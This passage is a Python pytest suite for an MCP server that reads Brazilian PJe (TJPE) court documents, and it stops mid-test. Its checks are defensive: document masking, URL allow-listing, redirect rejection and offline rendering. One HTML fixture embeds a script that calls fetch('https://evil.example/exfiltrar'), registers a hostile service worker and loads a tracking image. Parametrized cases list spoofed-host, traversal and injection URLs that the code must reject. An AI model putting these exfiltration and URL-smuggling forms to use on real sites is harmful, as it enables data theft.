from __future__ import annotations

# pyright: reportPrivateUsage=false
import asyncio
import hashlib
import os
import re
import stat
import threading
from collections.abc import AsyncGenerator, Awaitable, Callable
from contextlib import asynccontextmanager
from io import BytesIO
from pathlib import Path
from typing import cast

import pytest
from playwright.async_api import Browser, BrowserContext, Page, Route, async_playwright
from pypdf import PdfWriter
from pypdf.generic import DecodedStreamObject, DictionaryObject, NameObject

import mcp_pje_tjpe.pje_read as pje_read
from mcp_pje_tjpe.config import Settings
from mcp_pje_tjpe.errors import (
    CredenciaisAusentesError,
    InterfacePjeAlteradaError,
    ServicoIndisponivelError,
    ValidacaoError,
)
from mcp_pje_tjpe.models import Grau
from mcp_pje_tjpe.pje_auth import PjeSessionManager, ReadSessionLease
from mcp_pje_tjpe.pje_read import (
    PjeReadService,
    _AcervoBinding,
    _atomic_publish,
    _audited_autos_target,
    _autos_process_id,
    _DocumentBinding,
    _extract_document_text,
    _extract_pdf_sandboxed,
    _FetchedDocument,
    _is_exact_document_url,
    _page_is_partial,
    _stream_document_https,
    _validated_mime,
    parse_acervo_entries,
    parse_autos_header,
)


def _synthetic_npu(
    sequence: str = "9999999",
    *,
    year: str = "2099",
    origin: str = "9999",
) -> str:
    base = sequence + year + "8" + "17" + origin + "00"
    check_digits = 98 - (int(base) % 97)
    return f"{sequence}-{check_digits:02d}.{year}.8.17.{origin}"


def _lease(
    generation: str = "generation-a",
    grau: Grau = Grau.PRIMEIRO,
) -> ReadSessionLease:
    return ReadSessionLease(
        grau=grau,
        context=cast(BrowserContext, object()),
        page=cast(Page, object()),
        generation=generation,
    )


def _service(
    tmp_path: Path,
    *,
    registry_limit: int = 5_000,
    max_document_bytes: int = 3 * 1024 * 1024,
) -> PjeReadService:
    return PjeReadService(
        cast(PjeSessionManager, object()),
        Settings(
            data_dir=tmp_path / "data",
            downloads_dir=tmp_path / "downloads",
            max_document_bytes=max_document_bytes,
        ),
        registry_limit=registry_limit,
    )


class _FakeReadSessions:
    def __init__(self, lease: ReadSessionLease) -> None:
        self.lease = lease

    @asynccontextmanager
    async def read_session(self, grau: Grau) -> AsyncGenerator[ReadSessionLease]:
        assert grau is self.lease.grau
        yield self.lease


class _FakeCookieContext:
    def __init__(
        self,
        *,
        cookies: list[dict[str, str]] | None = None,
        error: Exception | None = None,
    ) -> None:
        self.cookies_result = cookies or []
        self.error = error
        self.calls: list[list[str]] = []

    async def cookies(self, urls: list[str]) -> list[dict[str, str]]:
        self.calls.append(urls)
        if self.error is not None:
            raise self.error
        return self.cookies_result


class _FakeAutosLocator:
    def __init__(self, text: str) -> None:
        self.text = text

    async def inner_text(self) -> str:
        return self.text


class _FakeOfflineAutosPage:
    def __init__(self, body_text: str) -> None:
        self.body_text = body_text
        self.default_timeouts: list[float] = []
        self.set_content_calls: list[tuple[str, str, float]] = []
        self.goto_calls = 0

    def set_default_timeout(self, timeout: float) -> None:
        self.default_timeouts.append(timeout)

    async def set_content(
        self,
        html: str,
        *,
        wait_until: str,
        timeout: float,  # noqa: ASYNC109 - espelha a API do Playwright
    ) -> None:
        self.set_content_calls.append((html, wait_until, timeout))

    def locator(self, selector: str) -> _FakeAutosLocator:
        assert selector == "body"
        return _FakeAutosLocator(self.body_text)

    async def goto(self, _url: str) -> None:
        self.goto_calls += 1
        raise AssertionError("o leitor offline não pode navegar")


class _FakeOfflineAutosContext:
    def __init__(self, page: _FakeOfflineAutosPage) -> None:
        self.page = page
        self.routes: list[tuple[str, Callable[[Route], Awaitable[None]]]] = []
        self.new_page_calls = 0
        self.close_calls = 0

    async def route(
        self,
        pattern: str,
        handler: Callable[[Route], Awaitable[None]],
    ) -> None:
        self.routes.append((pattern, handler))

    async def new_page(self) -> Page:
        self.new_page_calls += 1
        return cast(Page, self.page)

    async def close(self) -> None:
        self.close_calls += 1


class _FakeAutosBrowser:
    def __init__(self, offline_context: _FakeOfflineAutosContext) -> None:
        self.offline_context = offline_context
        self.new_context_calls: list[dict[str, object]] = []

    async def new_context(
        self,
        *,
        accept_downloads: bool,
        java_script_enabled: bool,
        service_workers: str,
    ) -> BrowserContext:
        self.new_context_calls.append(
            {
                "accept_downloads": accept_downloads,
                "java_script_enabled": java_script_enabled,
                "service_workers": service_workers,
            }
        )
        return cast(BrowserContext, self.offline_context)


class _FakeAuthenticatedAutosContext(_FakeCookieContext):
    def __init__(self, browser: _FakeAutosBrowser) -> None:
        super().__init__(cookies=[{"name": "JSESSIONID", "value": "abc123"}])
        self.browser = cast(Browser, browser)


class _FakeAuthenticatedAutosPage:
    def __init__(self, user_agent: str = "Mozilla/5.0 teste") -> None:
        self.user_agent = user_agent
        self.evaluate_calls: list[str] = []

    async def evaluate(self, expression: str) -> str:
        self.evaluate_calls.append(expression)
        return self.user_agent


class _FakeBlockedRoute:
    def __init__(self) -> None:
        self.abort_calls: list[str] = []

    async def abort(self, error_code: str) -> None:
        self.abort_calls.append(error_code)


class _FakeHTTPResponse:
    def __init__(
        self,
        *,
        status: int = 200,
        headers: dict[str, str] | None = None,
        chunks: list[bytes] | None = None,
        read_error: Exception | None = None,
    ) -> None:
        self.status = status
        self.headers = {key.casefold(): value for key, value in (headers or {}).items()}
        self.chunks = list(chunks or [])
        self.read_error = read_error
        self.read_sizes: list[int] = []

    def getheader(self, name: str, default: str | None = None) -> str | None:
        return self.headers.get(name.casefold(), default)

    def read(self, size: int) -> bytes:
        self.read_sizes.append(size)
        if self.read_error is not None:
            raise self.read_error
        if not self.chunks:
            return b""
        chunk = self.chunks.pop(0)
        if len(chunk) <= size:
            return chunk
        self.chunks.insert(0, chunk[size:])
        return chunk[:size]


class _FakeHTTPSConnection:
    def __init__(
        self,
        response: _FakeHTTPResponse,
        *,
        host: str,
        port: int,
        timeout: float,
    ) -> None:
        self.response = response
        self.host = host
        self.port = port
        self.timeout = timeout
        self.requests: list[tuple[str, str, dict[str, str]]] = []
        self.closed = False

    def request(self, method: str, target: str, *, headers: dict[str, str]) -> None:
        self.requests.append((method, target, headers))

    def getresponse(self) -> _FakeHTTPResponse:
        return self.response

    def close(self) -> None:
        self.closed = True


def _mock_https_connection(
    monkeypatch: pytest.MonkeyPatch,
    response: _FakeHTTPResponse,
) -> list[_FakeHTTPSConnection]:
    connections: list[_FakeHTTPSConnection] = []

    def factory(host: str, port: int, *, timeout: float) -> _FakeHTTPSConnection:
        connection = _FakeHTTPSConnection(
            response,
            host=host,
            port=port,
            timeout=timeout,
        )
        connections.append(connection)
        return connection

    monkeypatch.setattr(pje_read.http.client, "HTTPSConnection", factory)
    return connections


def _binding(
    *,
    generation: str = "generation-a",
    grau: Grau = Grau.PRIMEIRO,
    numero: str | None = None,
    processo_id: str = "123456",
    documento_id: str = "987654",
    titulo: str = "Decisão de mérito",
    blocked: bool = False,
) -> _DocumentBinding:
    return _DocumentBinding(
        generation=generation,
        grau=grau,
        numero=numero or _synthetic_npu(),
        processo_id=processo_id,
        documento_id=documento_id,
        titulo=titulo,
        bloqueado_por_ciencia=blocked,
    )


def _exact_document_url(binding: _DocumentBinding) -> str:
    return (
        f"https://pje.cloud.tjpe.jus.br/{binding.grau.value}"
        "/seam/resource/rest/pje-legacy/documento/download/"
        f"TJPE/{binding.grau.value}/{binding.processo_id}/{binding.documento_id}"
    )


def _pdf_with_blank_pages(total: int) -> bytes:
    writer = PdfWriter()
    for _ in range(total):
        writer.add_blank_page(width=72, height=72)
    stream = BytesIO()
    writer.write(stream)
    return stream.getvalue()


def _pdf_with_text(text: str) -> bytes:
    writer = PdfWriter()
    page = writer.add_blank_page(width=612, height=792)
    font = DictionaryObject(
        {
            NameObject("/Type"): NameObject("/Font"),
            NameObject("/Subtype"): NameObject("/Type1"),
            NameObject("/BaseFont"): NameObject("/Helvetica"),
        }
    )
    resources = DictionaryObject(
        {NameObject("/Font"): DictionaryObject({NameObject("/F1"): writer._add_object(font)})}
    )
    content = DecodedStreamObject()
    content.set_data(f"BT /F1 12 Tf 72 720 Td ({text}) Tj ET".encode("ascii"))
    page[NameObject("/Resources")] = resources
    page[NameObject("/Contents")] = writer._add_object(content)
    stream = BytesIO()
    writer.write(stream)
    return stream.getvalue()


def _authorize(
    service: PjeReadService,
    lease: ReadSessionLease,
    numero: str,
) -> None:
    processo_id = "20"
    autos_url = (
        f"https://pje.cloud.tjpe.jus.br/{lease.grau.value}"
        "/Processo/ConsultaProcesso/Detalhe/"
        f"listProcessoCompletoAdvogado.seam?id={processo_id}"
    )
    key = (lease.generation, lease.grau, numero)
    service._acervo[key] = _AcervoBinding(  # pyright: ignore[reportPrivateUsage]
        generation=lease.generation,
        grau=lease.grau,
        numero=numero,
        processo_id=processo_id,
        autos_url=autos_url,
    )


@pytest.fixture
def anyio_backend() -> str:
    return "asyncio"


def test_parse_acervo_entries_deduplicates_masks_and_preserves_order() -> None:
    first = _synthetic_npu()
    second = _synthetic_npu("9999998")
    entries = [
        {
            "text": f"Procedimento {first}",
            "context": (
                f"Procedimento {first} Segredo de Justiça PARTE AUTORA CPF: 111.111.111-11"
            ),
        },
        {
            "text": f"link duplicado {first}",
            "context": f"outra representação do processo {first}",
        },
        {
            "text": "Abrir processo",
            "context": f"Ação cível {second} EMPRESA CNPJ 11111111111111",
        },
    ]

    items = parse_acervo_entries(entries, Grau.PRIMEIRO)

    assert [item.numero for item in items] == [first, second]
    assert all(item.grau is Grau.PRIMEIRO for item in items)
    assert items[0].restrito is True
    assert items[1].restrito is False
    assert "111.111.111-11" not in items[0].resumo
    assert "CPF: ***.***.***-**" in items[0].resumo
    assert "11111111111111" not in items[1].resumo
    assert "CNPJ **.***.***/****-**" in items[1].resumo


@pytest.mark.parametrize(
    "blocked_text",
    [
        "TOMAR CIÊNCIA",
        "visualizar expediente",
        "Responder expediente",
    ],
)
def test_parse_acervo_entries_excludes_actionable_expedientes(blocked_text: str) -> None:
    numero = _synthetic_npu()

    items = parse_acervo_entries(
        [{"text": numero, "context": f"{numero} {blocked_text}"}],
        Grau.PRIMEIRO,
    )

    assert items == []


def test_parse_acervo_entries_ignores_invalid_or_non_tjpe_numbers() -> None:
    valid = _synthetic_npu()
    wrong_check = re.sub(r"-\d{2}\.", "-00.", valid)
    wrong_court = valid.replace(".8.17.", ".8.18.")

    items = parse_acervo_entries(
        [
            {"text": wrong_check, "context": wrong_check},
            {"text": wrong_court, "context": wrong_court},
            {"text": "sem NPU", "context": "conteúdo comum"},
        ],
        Grau.SEGUNDO,
    )

    assert items == []


def test_parse_acervo_entries_limits_summary_length() -> None:
    numero = _synthetic_npu()
    items = parse_acervo_entries(
        [{"text": numero, "context": f"{numero} " + ("conteúdo " * 300)}],
        Grau.PRIMEIRO,
    )

    assert len(items) == 1
    assert len(items[0].resumo) == 1_000


@pytest.mark.anyio
async def test_extract_acervo_entries_keeps_only_same_row_process_link_in_acervo() -> None:
    valid = _synthetic_npu()
    separate = _synthetic_npu("9999998")
    expediente = _synthetic_npu("9999997")
    outside = _synthetic_npu("9999996")
    async with async_playwright() as playwright:
        browser = await playwright.chromium.launch(headless=True)
        try:
            page = await browser.new_page()
            await page.set_content(
                f"""
                <!doctype html>
                <html><body>
                  <button role="tab" aria-selected="true"
                          aria-controls="painel-acervo">Acervo geral</button>
                  <section id="painel-acervo">
                    <table><tbody>
                      <tr id="processo-valido">
                        <td>{valid}</td>
                        <td><a id="autos-valido" href="/1g/Processo/ConsultaProcesso/Detalhe/
                          listProcessoCompletoAdvogado.seam?id=20">Autos</a></td>
                      </tr>
                      <tr id="atalho-sem-npu">
                        <td>Atalho de consulta</td>
                        <td><a id="atalho" href="/1g/Processo/ConsultaProcesso/Detalhe/
                          listProcessoCompletoAdvogado.seam?id=21">Abrir</a></td>
                      </tr>
                      <tr id="npu-sem-link"><td>{separate}</td></tr>
                      <tr id="link-em-outra-linha">
                        <td><a id="link-orfao" href="/1g/Processo/ConsultaProcesso/Detalhe/
                          listProcessoCompletoAdvogado.seam?id=22">Autos sem NPU</a></td>
                      </tr>
                    </tbody></table>
                    <section id="expedientes-pendentes">
                      <ul><li>{expediente}
                        <a id="expediente" href="/1g/Processo/ConsultaProcesso/Detalhe/
                          listProcessoCompletoAdvogado.seam?id=23">Tomar ciência</a>
                      </li></ul>
                    </section>
                    <a id="sem-container" href="/1g/Processo/ConsultaProcesso/Detalhe/
                      listProcessoCompletoAdvogado.seam?id=24">{outside}</a>
                  </section>
                  <aside id="atalhos-acervo">
                    <ul><li>{outside}
                      <a id="fora-lista" href="/1g/Processo/ConsultaProcesso/Detalhe/
                        listProcessoCompletoAdvogado.seam?id=25">Abrir processo</a>
                    </li></ul>
                  </aside>
                </body></html>
                """
            )

            entries = await PjeReadService._extract_acervo_entries(  # pyright: ignore[reportPrivateUsage]
                page
            )
            await page.get_by_role("tab", name="Acervo geral").evaluate(
                "(element) => element.removeAttribute('aria-controls')"
            )
            with pytest.raises(InterfacePjeAlteradaError, match="raiz estrutural"):
                await PjeReadService._extract_acervo_entries(  # pyright: ignore[reportPrivateUsage]
                    page
                )
        finally:
            await browser.close()

    assert len(entries) == 1
    assert entries[0]["text"] == "Autos"
    assert valid in entries[0]["context"]
    assert entries[0]["href"].endswith("listProcessoCompletoAdvogado.seam?id=20")


def test_parse_autos_header_accepts_separate_and_inline_labels() -> None:
    header = parse_autos_header(
        """
        Classe judicial
        Procedimento Comum Cível
        Assunto: Responsabilidade Civil
        Valor da causa
        R$ 10.000,00
        Texto não relacionado
        """
    )

    assert header == {
        "Classe judicial": "Procedimento Comum Cível",
        "Assunto": "Responsabilidade Civil",
        "Valor da causa": "R$ 10.000,00",
    }


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("Página 1 de 4", True),
        ("1 DE 2", True),
        ("Página 4 de 4", False),
        ("sem paginação", False),
    ],
)
def test_page_is_partial(text: str, expected: bool) -> None:
    assert _page_is_partial(text) is expected


@pytest.mark.parametrize(
    ("url", "grau", "expected"),
    [
        (
            "https://pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/"
            "listAutosDigitais.seam?idProcesso=123456&ca=opaco",
            Grau.PRIMEIRO,
            "123456",
        ),
        (
            "https://pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/"
            "listProcessoCompletoAdvogado.seam?id=123456&ca=opaco",
            Grau.PRIMEIRO,
            "123456",
        ),
        (
            "https://pje.cloud.tjpe.jus.br/2g/Processo/ConsultaProcesso/Detalhe/"
            "listProcessoCompleto.seam?id=7",
            Grau.SEGUNDO,
            "7",
        ),
        (
            "https://pje.cloud.tjpe.jus.br/2g/ng2/dev.seam#autos-digitais/123456/",
            Grau.SEGUNDO,
            "123456",
        ),
    ],
)
def test_autos_process_id_accepts_only_audited_route_shapes(
    url: str,
    grau: Grau,
    expected: str,
) -> None:
    assert _autos_process_id(url, grau) == expected


@pytest.mark.parametrize(
    "url",
    [
        "http://pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam?id=1",
        "https://pje.cloud.tjpe.jus.br.evil.example/1g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam?id=1",
        "https://usuario@pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam?id=1",
        "https://pje.cloud.tjpe.jus.br:443/1g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam?id=1",
        "https://pje.cloud.tjpe.jus.br/2g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam?id=1",
        "https://pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/"
        "paginaNaoAuditada.seam?id=1",
        "https://pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam?idProcesso=1",
        "https://pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam?id=1&id=2",
        "https://pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam?id=1&extra=2",
        "https://pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam?id=1&ca=invalido%0A",
        "https://pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam?id=-1",
        "https://pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam?id=123456789012345678901",
        "https://pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/%2e%2e/"
        "listProcessoCompletoAdvogado.seam?id=1",
        "https://pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam%5cextra?id=1",
        "https://pje.cloud.tjpe.jus.br/1g/ng2/dev.seam#autos-digitais/abc",
        "https://pje.cloud.tjpe.jus.br/1g/ng2/dev.seam#outra-tela/123",
    ],
)
def test_autos_process_id_rejects_host_degree_path_and_identifier_confusion(url: str) -> None:
    assert _autos_process_id(url, Grau.PRIMEIRO) is None


def test_audited_autos_target_accepts_only_literal_known_get_route() -> None:
    entry = {
        "href": "",
        "absoluteHref": "",
        "onclick": (
            "abrirJanela('Processo/ConsultaProcesso/Detalhe/"
            "listProcessoCompletoAdvogado.seam?id=123456&amp;ca=opaque_code')"
        ),
    }

    assert _audited_autos_target(entry, Grau.PRIMEIRO) == (
        "https://pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam?id=123456&ca=opaque_code",
        "123456",
    )


@pytest.mark.parametrize(
    "href",
    [
        "https://evil.example/1g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam?id=1",
        "Processo/ConsultaProcesso/Detalhe/listProcessoCompletoAdvogado.seam?id=1&extra=2",
        "Processo/ConsultaProcesso/Detalhe/listProcessoCompletoAdvogado.seam?id=1&ca=invalido%0A",
        "javascript:abrirProcesso(1)",
    ],
)
def test_audited_autos_target_rejects_external_script_and_unaudited_query(
    href: str,
) -> None:
    assert _audited_autos_target({"href": href}, Grau.PRIMEIRO) is None


def test_exact_document_url_requires_exact_scheme_host_path_and_no_suffixes() -> None:
    binding = _binding()
    exact = (
        "https://pje.cloud.tjpe.jus.br/1g/seam/resource/rest/pje-legacy/"
        "documento/download/TJPE/1g/123456/987654"
    )

    assert _is_exact_document_url(exact, binding)
    assert _is_exact_document_url(exact + "?token=segredo", binding) is False
    assert _is_exact_document_url(exact + "#fragmento", binding) is False
    assert _is_exact_document_url(exact.replace("https://", "http://"), binding) is False
    assert (
        _is_exact_document_url(exact.replace("pje.cloud.tjpe.jus.br", "evil.example"), binding)
        is False
    )
    assert _is_exact_document_url(exact.replace("/1g/123456/", "/2g/123456/"), binding) is False
    assert _is_exact_document_url(exact.replace("/987654", "/987655"), binding) is False


@pytest.mark.anyio
async def test_open_autos_fetches_https_then_loads_only_in_locked_offline_context(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    service = _service(tmp_path)
    numero = _synthetic_npu()
    offline_page = _FakeOfflineAutosPage(numero)
    offline_context = _FakeOfflineAutosContext(offline_page)
    browser = _FakeAutosBrowser(offline_context)
    authenticated_context = _FakeAuthenticatedAutosContext(browser)
    authenticated_page = _FakeAuthenticatedAutosPage()
    lease = ReadSessionLease(
        grau=Grau.PRIMEIRO,
        context=cast(BrowserContext, authenticated_context),
        page=cast(Page, authenticated_page),
        generation="generation-a",
    )
    _authorize(service, lease, numero)
    autos_html = f"""
        <!doctype html><html><body>
          <h1>{numero}</h1>
          <script>
            window.scriptExecutado = true;
            fetch('https://evil.example/exfiltrar');
            navigator.serviceWorker.register('/hostil.js');
          </script>
          <img src="https://evil.example/rastreio.png">
        </body></html>
    """.encode()
    stream_calls: list[tuple[str, str, str, int, float]] = []

    def stream(
        url: str,
        *,
        cookie_header: str,
        user_agent: str,
        max_bytes: int,
        timeout_seconds: float,
    ) -> tuple[bytes, str]:
        stream_calls.append((url, cookie_header, user_agent, max_bytes, timeout_seconds))
        return autos_html, "text/html; charset=utf-8"

    monkeypatch.setattr(pje_read, "_stream_document_https", stream)

    autos_page, returned_context, process_id = await service._open_autos_from_acervo(  # pyright: ignore[reportPrivateUsage]
        lease,
        numero,
    )

    expected_url = (
        "https://pje.cloud.tjpe.jus.br/1g/Processo/ConsultaProcesso/Detalhe/"
        "listProcessoCompletoAdvogado.seam?id=20"
    )
    assert autos_page is cast(Page, offline_page)
    assert returned_context is cast(BrowserContext, offline_context)
    assert process_id == "20"
    assert authenticated_context.calls == [[expected_url]]
    assert authenticated_page.evaluate_calls == ["navigator.userAgent"]
    assert stream_calls == [
        (
            expected_url,
            "JSESSIONID=abc123",
            "Mozilla/5.0 teste",
            pje_read._MAX_AUTOS_HTML_BYTES,  # pyright: ignore[reportPrivateUsage]
            service.config.timeout_ms / 1_000,
        )
    ]
    assert browser.new_context_calls == [
        {
            "accept_downloads": False,
            "java_script_enabled": False,
            "service_workers": "block",
        }
    ]
    assert offline_context.new_page_calls == 1
    assert offline_context.routes[0][0] == "**/*"
    assert offline_page.default_timeouts == [service.config.timeout_ms]
    assert offline_page.set_content_calls == [
        (autos_html.decode(), "domcontentloaded", service.config.timeout_ms)
    ]
    assert offline_page.goto_calls == 0

    blocked_route = _FakeBlockedRoute()
    await offline_context.routes[0][1](cast(Route, blocked_route))
    assert blocked_route.abort_calls == ["blockedbyclient"]
    assert offline_context.close_calls == 0
    await returned_context.close()
    assert offline_context.close_calls == 1


@pytest.mark.anyio
async def test_download_document_bytes_forwards_scoped_cookies_to_streamer(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    service = _service(tmp_path)
    binding = _binding()
    context = _FakeCookieContext(
        cookies=[
            {"name": "JSESSIONID", "value": "abc123"},
            {"name": "KEYCLOAK_SESSION", "value": "opaque-token"},
        ]
    )
    calls: list[tuple[str, str, str, int, float]] = []

    def stream(
        url: str,
        *,
        cookie_header: str,
        user_agent: str,
        max_bytes: int,
        timeout_seconds: float,
    ) -> tuple[bytes, str]:
        calls.append((url, cookie_header, user_agent, max_bytes, timeout_seconds))
        return b"conteudo", "text/plain; charset=utf-8"

    monkeypatch.setattr(pje_read, "_stream_document_https", stream)

    fetched = await service._download_document_bytes(  # pyright: ignore[reportPrivateUsage]
        cast(BrowserContext, context),
        binding,
        user_agent="Mozilla/5.0 teste",
    )

    assert fetched.binding is binding
    assert fetched.body == b"conteudo"
    assert fetched.mime_type == "text/plain"
    assert fetched.sha256 == hashlib.sha256(b"conteudo").hexdigest()
    assert context.calls == [[_exact_document_url(binding)]]
    assert calls == [
        (
            _exact_document_url(binding),
            "JSESSIONID=abc123; KEYCLOAK_SESSION=opaque-token",
            "Mozilla/5.0 teste",
            service.config.max_document_bytes,
            service.config.timeout_ms / 1_000,
        )
    ]


@pytest.mark.anyio
async def test_download_document_bytes_requires_session_cookies(tmp_path: Path) -> None:
    service = _service(tmp_path)
    binding = _binding()
    context = _FakeCookieContext()

    with pytest.raises(CredenciaisAusentesError, match="não forneceu cookies"):
        await service._download_document_bytes(  # pyright: ignore[reportPrivateUsage]
            cast(BrowserContext, context),
            binding,
            user_agent="Mozilla/5.0",
        )

    assert context.calls == [[_exact_document_url(binding)]]


@pytest.mark.anyio
async def test_download_document_bytes_sanitizes_generic_stream_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    service = _service(tmp_path)
    binding = _binding()
    context = _FakeCookieContext(cookies=[{"name": "JSESSIONID", "value": "abc123"}])

    def fail_stream(
        _url: str,
        *,
        cookie_header: str,
        user_agent: str,
        max_bytes: int,
        timeout_seconds: float,
    ) -> tuple[bytes, str]:
        del cookie_header, user_agent, max_bytes, timeout_seconds
        raise RuntimeError("cookie=segredo; token=nao-vazar")

    monkeypatch.setattr(pje_read, "_stream_document_https", fail_stream)

    with pytest.raises(
        ServicoIndisponivelError,
        match="não foi possível baixar o documento autenticado",
    ) as captured:
        await service._download_document_bytes(  # pyright: ignore[reportPrivateUsage]
            cast(BrowserContext, context),
            binding,
            user_agent="Mozilla/5.0",
        )

    assert "segredo" not in str(captured.value)
    assert "nao-vazar" not in str(captured.value)


def test_stream_document_https_succeeds_and_closes_connection(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binding = _binding()
    response = _FakeHTTPResponse(
        headers={"content-type": "text/plain", "content-length": "8"},
        chunks=[b"cont", b"eudo"],
    )
    connections = _mock_https_connection(monkeypatch, response)

    body, content_type = _stream_document_https(
        _exact_document_url(binding),
        cookie_header="JSESSIONID=abc123",
        user_agent="Mozilla/5.0 teste",
        max_bytes=8,
        timeout_seconds=12.5,
    )

    assert body == b"conteudo"
    assert content_type == "text/plain"
    assert len(connections) == 1
    connection = connections[0]
    assert (connection.host, connection.port, connection.timeout) == (
        "pje.cloud.tjpe.jus.br",
        443,
        12.5,
    )
    assert connection.requests == [
        (
            "GET",
            "/1g/seam/resource/rest/pje-legacy/documento/download/TJPE/1g/123456/987654",
            {
                "Accept-Encoding": "identity",
                "Cookie": "JSESSIONID=abc123",
                "User-Agent": "Mozilla/5.0 teste",
            },
        )
    ]
    assert response.read_sizes == [9, 5, 1]
    assert connection.closed is True


def test_stream_document_https_rejects_http_error_before_reading_body_and_closes(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binding = _binding()
    response = _FakeHTTPResponse(
        status=503,
        chunks=[b"detalhes internos que nao devem aparecer"],
    )
    connections = _mock_https_connection(monkeypatch, response)

    with pytest.raises(ServicoIndisponivelError, match="respondeu HTTP 503") as captured:
        _stream_document_https(
            _exact_document_url(binding),
            cookie_header="JSESSIONID=abc123",
            user_agent="Mozilla/5.0",
            max_bytes=8,
            timeout_seconds=10,
        )

    assert "detalhes internos" not in str(captured.value)
    assert response.read_sizes == []
    assert connections[0].closed is True


@pytest.mark.parametrize(
    "location",
    [
        "https://sso.cloud.pje.jus.br/auth/realms/pje/protocol/openid-connect/auth"
        "?session_code=segredo",
        "/1g/login.seam?state=segredo",
    ],
)
def test_stream_document_https_rejects_login_redirect_without_following(
    monkeypatch: pytest.MonkeyPatch,
    location: str,
) -> None:
    binding = _binding()
    response = _FakeHTTPResponse(
        status=302,
        headers={"location": location},
        chunks=[b"nao ler"],
    )
    connections = _mock_https_connection(monkeypatch, response)

    with pytest.raises(CredenciaisAusentesError, match="sessão expirou"):
        _stream_document_https(
            _exact_document_url(binding),
            cookie_header="JSESSIONID=abc123",
            user_agent="Mozilla/5.0",
            max_bytes=8,
            timeout_seconds=10,
        )

    assert len(connections) == 1
    assert response.read_sizes == []
    assert connections[0].closed is True


def test_stream_document_https_rejects_other_redirect_without_following(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binding = _binding()
    response = _FakeHTTPResponse(
        status=307,
        headers={"location": "https://evil.example/documento"},
    )
    connections = _mock_https_connection(monkeypatch, response)

    with pytest.raises(ServicoIndisponivelError, match="nenhum redirecionamento"):
        _stream_document_https(
            _exact_document_url(binding),
            cookie_header="JSESSIONID=abc123",
            user_agent="Mozilla/5.0",
            max_bytes=8,
            timeout_seconds=10,
        )

    assert len(connections) == 1
    assert response.read_sizes == []
    assert connections[0].closed is True


def test_stream_document_https_rejects_content_length_over_limit_before_reading(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binding = _binding()
    response = _FakeHTTPResponse(
        headers={"content-type": "text/plain", "content-length": "9"},
        chunks=[b"nao ler"],
    )
    connections = _mock_https_connection(monkeypatch, response)

    with pytest.raises(ValidacaoError, match="excede o limite"):
        _stream_document_https(
            _exact_document_url(binding),
            cookie_header="JSESSIONID=abc123",
            user_agent="Mozilla/5.0",
            max_bytes=8,
            timeout_seconds=10,
        )

    assert response.read_sizes == []
    assert connections[0].closed is True


def test_stream_document_https_stops_when_actual_body_exceeds_limit(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    binding = _binding()
    response = _FakeHTTPResponse(
        headers={"content-type": "text/plain"},
        chunks=[b"123456789", b"nao ler"],
    )
    connections = _mock_https_connection(monkeypatch, response)

    with pytest.raises(ValidacaoError, match="excede o limite"):
        _stream_document_https(
            _exact_document_url(binding),
            cookie_header="JSESSIONID=abc123",
            user_agent="Mozilla/5.0",
            max_bytes=8,
            timeout_seconds=10,
        )

    assert response.read_sizes == [9]
    assert response.chunks == [b"nao ler"]
    assert connections[0].closed is True


@pytest.mark.anyio
async def test_document_and_movement_javascript_extractors_run_locally_without_network(
    tmp_path: Path,
) -> None:
    service = _service(tmp_path)
    async with async_playwright() as playwright:
        browser = await playwright.chromium.launch(headless=True)
        try:
            page = await browser.new_page()
            await page.set_content(
                """
                <!doctype html>
                <html><body>
                  <form id="divTimeLine">
                    <div class="media data">
                      <span class="data-interna">01/09/2026 10:20</span>
                    </div>
                    <div class="media">
                      <div class="media-body">
                        Juntada realizada - CPF: 111.111.111-11
                      </div>
                    </div>
                    <div class="media tipo-D">
                      <a onclick="abrirLinkDocumento('101')">
                        <span class="title">101 - Petição Inicial</span>
                      </a>
                      <time>31/08/2026</time>
                    </div>
                    <div class="media tipo-D">
                      <a onclick="abrirLinkDocumento(&quot;102&quot;)">
                        <span class="title">102 - Decisão</span>
                      </a>
                      <time>01/09/2026</time>
                    </div>
                    <div class="media tipo-D">
                      <a onclick="abrirLinkDocumento('../invalido')">inválido</a>
                    </div>
                  </form>
                </body></html>
                """
            )

            documents, partial = await service._extract_documents(  # pyright: ignore[reportPrivateUsage]
                page,
                10,
            )
